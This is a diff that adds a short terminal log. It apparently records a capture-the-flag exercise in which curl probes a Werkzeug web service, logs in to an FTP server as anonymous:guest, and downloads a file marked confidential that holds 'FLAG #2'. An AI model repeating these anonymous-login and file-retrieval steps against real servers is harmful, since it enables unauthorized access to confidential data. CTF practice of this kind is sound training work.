@@ -1,0 +1,23 @@
+ nestea@TS-676767  /mnt/…/Programing   main                                                      ✓ 0  15:56:47
+ ❯ curl -I http://172.104.142.244:11700
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.8 Python/3.10.12
+Date: Tue, 02 Jun 2026 13:56:49 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7748
+Connection: close
+
+
+ nestea@TS-676767  /mnt/…/Programing   main                                                      ✓ 0  15:56:48
+ ❯ curl ftp://172.104.142.244:11701/ --user anonymous:guest
+-rw-r--r--   1 root     root          126 Jun 01 12:29 README.txt
+-rw-r--r--   1 root     root          105 Jun 01 12:29 backup_2023.txt
+-rw-r--r--   1 root     root          137 Jun 01 12:29 secret.txt
+
+ nestea@TS-676767  /mnt/…/Programing   main                                                      ✓ 0  15:56:56
+ ❯ curl -s ftp://172.104.142.244:11701/secret.txt --user anonymous:guest
+=== PLIK WEWNETRZNY ===
+KLASYFIKACJA: POUFNE
+Nie udostepniac poza dzialem IT.
+
+FLAG #2: Anonimowy dostep do FTP - znaleziono tajny plik!
